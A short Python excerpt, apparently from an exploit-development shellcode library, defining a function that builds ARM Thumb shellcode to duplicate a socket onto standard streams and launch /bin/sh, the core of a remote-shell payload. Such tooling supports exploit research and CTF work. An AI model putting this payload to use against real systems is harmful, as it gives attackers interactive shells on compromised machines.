# dupsh(sock, sh)
def ARM_THUMB_DUPSH(sock=4, sh='/bin/sh'):
    sc = ARM_THUMB_DUP(sock)
    sc += ARM_THUMB_SH(sh)
    return sc
